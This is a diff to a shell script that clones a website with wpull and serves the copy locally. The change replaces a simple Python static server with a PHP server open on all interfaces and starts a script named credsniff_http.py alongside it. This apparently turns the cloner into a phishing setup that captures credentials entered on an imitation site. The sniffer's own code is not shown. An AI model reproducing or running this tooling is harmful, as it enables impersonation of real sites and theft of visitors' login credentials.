@@ -9,6 +9,7 @@ fi
 echo "[+] Running clone for $WEBSITE"
 
 OUTPUT_FILE=$(echo $WEBSITE | sed "s~http[s]*://~~g")
+IFS='/'; OUTPUT_FILE=($OUTPUT_FILE); unset IFS;
 
 wpull "$WEBSITE" \
  --no-check-certificate \
@@ -28,5 +29,6 @@ wpull "$WEBSITE" \
 if [[ ! -z "$SRV_PORT" ]]; then
   cd $OUTPUT_FILE
   echo "[+] Running webserver on port $SRV_PORT."
-  python -m http.server $SRV_PORT
+  php -S 0.0.0.0:$SRV_PORT -t . &
+  python $APP_DIR/credsniff_http.py
 fi
